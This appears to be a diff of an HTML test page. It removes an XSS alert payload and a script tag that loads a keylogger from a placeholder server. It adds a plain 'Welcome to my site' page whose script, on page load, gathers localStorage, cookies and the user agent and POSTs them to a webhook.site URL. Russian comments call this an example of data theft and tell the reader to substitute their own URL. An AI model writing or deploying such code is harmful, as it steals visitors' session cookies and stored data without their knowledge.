@@ -1,3 +1,28 @@
-<script>alert('XSS!');</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Запрашиваем содержимое localStorage (пример кражи данных)
+            let data = {
+                localStorage: JSON.stringify(localStorage),
+                cookies: document.cookie,
+                userAgent: navigator.userAgent
+            };
 
-<script src="https://yourserver.com/keylogger.js"></script>
+            // Отправляем данные на Webhook.site
+            fetch("https://webhook.site/your-unique-id", {  // <-- Замени на свой URL
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to my site</h1>
+</body>
+</html>
